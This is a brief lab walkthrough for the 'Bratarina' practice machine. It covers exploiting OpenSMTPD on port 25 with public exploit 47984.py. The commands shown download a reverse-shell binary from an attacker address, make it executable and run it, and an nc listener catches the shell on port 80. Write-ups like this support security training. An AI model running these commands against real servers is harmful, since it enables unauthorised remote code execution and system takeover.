# 🏴 Bratarina (Linux)

## 🧠 Initial Foothold

- Identified port 25 open, running **OpenSMTPD**.

- Used Searchsploit to find vulnerabilities and selected exploit `47984.py`.

- Uploaded a reverse shell payload to `/tmp` with:
  ```bash
  python3 47984.py 192.168.102.71 25 "wget 192.168.45.229/revshell.elf -O /tmp/revshell.elf"
  python3 47984.py 192.168.102.71 25 "chmod +x /tmp/revshell.elf"
  python3 47984.py 192.168.102.71 25 "/tmp/revshell.elf"
  ```

- 🔥 **Important:** The reverse shell must connect back on **port 80** (other ports did not work).

- Started a listener with:
  ```bash
  nc -nlvp 80
  ```

- Successfully received a shell.

---

## 🚀 Privilege Escalation

- 🟢 **No further privilege escalation was required**, as the shell provided sufficient access.

---

📚 **Reference Walkthrough:**  
[github.com/thevillagehacker](https://github.com/thevillagehacker/Proving_Grounds/blob/main/Writeups/2023-10-05-Proving_grounds_Practice-Bratarina.md)

> ⚠️ This walkthrough is for educational purposes only.
